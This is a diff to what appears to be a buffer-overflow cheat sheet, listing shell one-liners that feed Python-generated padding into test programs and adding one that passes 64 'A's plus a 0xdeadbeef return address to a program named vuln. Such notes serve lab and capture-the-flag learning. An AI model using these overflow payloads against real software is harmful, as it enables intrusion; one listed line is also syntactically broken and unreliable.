@@ -18,6 +18,9 @@ $ python -c 'print "A"*(16*4)' | ./exploitableProgram
 $ export MYVAR=`python -c 'print "A"*64 + chr(0x0a) + chr(0x0d) + chr(0x0a) + chr (0x0d)'`
 $ python -c 'import struct struct.pack("I", 0xFFFFFFF3)'
 $ (python exploit.py ; cat) | /tmp/exploitable
+
+$ # Send program output as parameter
+$ ./vuln `python -c 'print "A"*64 + "\xef\xbe\xad\xde"'`
 ```
 
 
